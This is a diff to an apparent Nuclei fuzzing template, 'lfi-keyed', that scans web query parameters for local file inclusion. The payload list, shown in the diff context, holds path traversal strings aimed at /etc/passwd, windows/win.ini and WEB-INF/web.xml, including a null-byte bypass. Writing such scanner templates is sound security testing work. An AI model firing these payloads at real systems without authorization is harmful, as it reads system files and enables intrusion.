@@ -1,15 +1,15 @@
 http:
 - fuzzing:
   - fuzz:
-    - '{{pathtraversal}}'
+    - '{{lfi}}'
     mode: single
     part: query
   - fuzz:
-    - '{{pathtraversal}}'
+    - '{{lfi}}'
     mode: single
     part: query
     values:
-    - ^(./|../|/)|(.html|.htm|.xml|.conf|.cfg|.log|.txt|.pdf|.doc|.docx|.xls|.csv|.png|.jpg|.gif)$
+    - ^(./|../|/)|(.html|.htm|.xml|.conf|.cfg|.log|.txt|.pdf|.doc|.docx|.xls|.csv|.png|.jpg|.jpeg|.gif)$
   matchers:
   - part: body
     regex:
@@ -28,8 +28,11 @@ http:
     - (<system.webServer[\s\S]+<\/system.webServer>)
     type: regex
   matchers-condition: or
+  method: GET
+  path:
+  - '{{BaseURL}}'
   payloads:
-    pathtraversal:
+    lfi:
     - '{{fuzz}}etc/passwd'
     - '{{fuzz}}windows/win.ini'
     - /etc/passwd%00.jpg
@@ -55,19 +58,15 @@ http:
     - ./WEB-INF/web.xml
     - ../WEB-INF/web.xml
     - ../../WEB-INF/web.xml
-  pre-condition:
-  - dsl:
-    - method == "GET"
-    type: dsl
   stop-at-first-match: true
 id: lfi-keyed
 info:
   author: pwnhxl
-  name: LFI Detection - Keyed
+  name: Key LFI Detection
   reference:
   - https://owasp.org/www-community/attacks/Unicode_Encoding
   severity: high
-  tags: fuzzing-req-query,lfi,dast
+  tags: fuzzing-lfi,fuzzing-req,dast
 variables:
   fuzz: ../../../../../../../../../../../../../../../
   fuzz_bypass_replace: '.../.../.../.../.../.../.../.../.../.../.../.../.../.../.../'
